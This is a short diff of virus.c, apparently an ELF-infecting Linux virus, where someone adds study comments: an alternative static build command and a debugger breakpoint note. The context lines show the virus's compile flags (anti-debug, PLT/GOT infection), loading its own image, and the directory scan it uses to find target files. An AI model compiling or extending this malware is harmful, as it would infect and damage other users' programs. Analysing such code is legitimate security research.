@@ -5,7 +5,7 @@
  * Compile:
  * gcc -g -O0 -D ANTIDEBUG -D INFECT_PLTGOT  -fno-stack-protector -c virus.c -fpic -o virus.o
  * gcc -N -fno-stack-protector -nostdlib virus.o -o virus
- *
+ * //PER: gcc -N -static -fno-stack-protector -nostdlib virus.o -o virus
  * Using -DDEBUG will allow Virus to print debug output
  *
  * Usage:
@@ -792,7 +792,7 @@ rescan:
 	
 
 	load_self(&self); // PER: mem, size fields of this self elf file is filled
-	
+	//PER: break at $14 = (void (*)()) 0x401dfb <do_main+264>
 	for (;;) {
 		nread = _getdents64(dd, (struct linux_dirent64 *)dbuf, 32768); //32768 is the size of dbuf
 		//PER: nread is the number of bytes read from the directory, `all files directly in a single dbuf buffer`
